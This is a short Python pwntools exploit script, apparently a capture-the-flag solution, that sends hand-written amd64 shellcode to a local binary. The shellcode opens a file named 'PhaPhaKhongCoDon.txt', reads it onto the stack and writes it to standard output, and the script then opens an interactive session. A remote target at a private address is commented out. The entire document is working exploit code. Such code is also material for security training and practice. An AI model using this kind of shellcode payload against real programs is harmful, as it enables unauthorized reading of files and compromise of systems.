#!/usr/bin/env python
from pwn import *

context.binary = e = ELF("./shellcode")
# l = ELF("./libc.so.6")

context.arch = 'amd64'
# r = remote("10.81.0.7", 14003)
r = process(["./shellcode"])
r.recvline()
# open("./PhaPhaKhongCoDon.txt",0)
pl = asm('''
        mov rax, 2
        mov rcx, 0x000000007478742e
        push rcx
        mov rcx, 0x6e6f446f43676e6f
        push rcx
        mov rcx, 0x684b616850616850 
        push rcx
        mov rdi, rsp
        xor rsi, rsi
        syscall
''')
# read('rax','rsp', 0x100)
pl += asm('''
        mov rdi, rax
        mov rax, 0
        mov rsi, rsp
        mov rdx, 0x100
        syscall
''')
# write(1,'rsp', 0x100)
pl += asm('''
        mov rax, 1
        mov rdi, 1
        mov rsi, rsp
        mov rdx, 0x100
        syscall
''')
r.sendline(pl)
r.interactive()
